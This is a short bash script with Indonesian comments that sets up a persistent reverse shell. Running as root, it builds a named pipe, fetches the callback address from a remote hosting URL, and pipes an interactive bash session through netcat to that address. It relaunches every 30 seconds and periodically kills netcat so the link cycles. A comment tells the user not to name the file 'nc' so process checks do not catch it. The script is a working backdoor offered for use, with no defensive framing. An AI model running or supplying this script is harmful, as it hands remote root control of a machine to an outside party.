#!/bin/bash
# jangan beri nama file ini dengan nc atau netcat agar saat pgrep terhindar dari doble pid
if [[ "$(id -u)" != "0" ]];then
 echo "    GAGAL !!!,kamu harus dalam mode root"
 exit 0
fi

matikanNc() {
   # ini akan mematikan nc di tiap 120 detik
   sleep 10
   while [ "$(pgrep -f nc)" != "" ]; do sleep 120; echo "dimatikan"; kill -9 $(pgrep -f nc); done
   echo "jalan"
   exit 0
}

rm -rf /tmp/f

mkfifo /tmp/f

while true; do

 if [ "$(pgrep -f ./nc)" = "" ]; then
  IP=$(curl -s https://ibnusaja.nasihosting.com/temp.txt)
  # PORT="29399"
  matikanNc > /dev/null 2> /dev/null &
  cat /tmp/f | /bin/bash -i 2>&1 | nc $IP > /tmp/f
 fi

 # echo "sudah jalan"
 sleep 30
done
